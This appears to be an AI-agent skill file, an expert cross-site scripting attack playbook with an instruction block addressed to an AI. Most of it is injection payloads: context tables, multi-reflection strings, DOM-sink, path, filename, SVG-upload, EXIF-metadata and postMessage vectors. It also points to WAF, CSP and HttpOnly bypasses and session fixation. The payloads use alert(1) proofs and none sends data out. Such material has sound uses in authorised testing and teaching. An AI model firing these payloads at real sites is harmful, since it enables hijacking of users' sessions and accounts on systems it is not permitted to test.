---
name: xss-cross-site-scripting
description: "XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths."
when-to-use: >-
  XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths.
---

# SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: This skill covers non-obvious XSS techniques, context-specific payload selection, WAF bypass, CSP bypass, and post-exploitation. Assume the reader already knows `<script>alert(1)</script>` — this file only covers what base models typically miss. For real-world CVE cases, HttpOnly bypass strategies, XS-Leaks side channels, and session fixation attacks, load the companion SCENARIOS.md.

## 0. RELATED ROUTING

### Extended Scenarios

Also load SCENARIOS.md when you need:
- Django debug page XSS (CVE-2017-12794) — duplicate key error → unescaped exception → XSS
- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)
- HttpOnly bypass methodology — proxy-the-browser, session riding, CSRF-via-XSS
- XS-Leaks side channel attacks — timing oracle, cache probing, `performance.now()` measurement
- Session fixation via XSS — pre-set session ID before victim login
- DOM clobbering techniques for CSP-restricted environments

### Advanced Tricks

Also load ADVANCED_XSS_TRICKS.md when you need:
- mXSS / DOMPurify bypass — namespace confusion, `<noscript>` parsing differential, form/table restructuring
- DOM Clobbering — property override via `id`/`name`, HTMLCollection, deep property chains
- Modern framework XSS — React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR
- Trusted Types bypass — default policy abuse, non-TT sinks, policy passthrough
- Service Worker XSS persistence — malicious SW registration, fetch interception, post-patch survival
- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks
- XS-Leaks & side channels — timing oracle, frame counting, cache probing, error event oracle

Before broad payload spraying, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior

### Quick context picks

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

---

## 1. INJECTION CONTEXT MATRIX

Identify context **before** picking a payload. Wrong context = wasted attempts.

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute value | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Inline attr, no tag close | Quoted, `>` stripped | Event injection | `"autofocus onfocus=alert(1)//` |
| Block tag (title/script/textarea) | `<title>INPUT</title>` | Close tag first | `</title><svg onload=alert(1)>` |
| href / src / data / action | link or form | Protocol | `javascript:alert(1)` |
| JS string (single quote) | `var x='INPUT'` | Break string | `'-alert(1)-'` or `'-alert(1)//` |
| JS string with escape | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS logical block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere on page | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |
| XML page (`text/xml`) | XML content-type | XML namespace | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. MULTI-REFLECTION ATTACKS

When input reflects in **multiple places** on the same page — single payload triggers from all points:

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED INJECTION VECTORS

### DOM Insert Injection (when reflection is in DOM not source)
Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
For URL-controlled resource insertion:
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF Path Injection
When URL itself is reflected in form `action`:
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
Inject between `.php` and `?`, using leading `/`.

### File Upload XSS

**Filename injection** (when filename is reflected):
```
"><svg onload=alert(1)>.gif
```

**SVG upload** (stored XSS via image upload accepting SVG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Metadata injection** (when EXIF is reflected):
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS (no origin check)
When page has `window.addEventListener('message', ...)` without origin validation:
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。

> 📎 **参考文档说明**：本 skill 转自上游开源仓库，以下参考文档**未随本库分发**：`ADVANCED_XSS_TRICKS.md`、`SCENARIOS.md`。相关主题的要点已保留在本文对应描述中；如需展开内容，请按正文关键词在库内 grep 或自行检索。
